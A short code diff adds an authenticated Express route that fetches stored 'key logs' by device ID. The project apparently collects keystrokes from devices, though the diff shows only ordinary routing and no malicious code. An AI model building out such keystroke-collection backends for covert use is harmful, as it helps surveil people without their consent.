@@ -1,5 +1,5 @@
 import express from "express";
-import { addNewKeyLogs } from "../controllers/keylogs.controller";
+import { addNewKeyLogs, getKeyLogs } from "../controllers/keylogs.controller";
 import { check } from "express-validator";
 import { authenticateJwt } from "../middleware/auth.middleware";
 
@@ -30,6 +30,14 @@ router.post(
 	],
 	authenticateJwt,
 	addNewKeyLogs
+);
+
+// Get key logs
+router.get(
+	"/keylogs/get/:deviceId/",
+	[check("deviceId").notEmpty()],
+	authenticateJwt,
+	getKeyLogs
 );
 
 export default router;
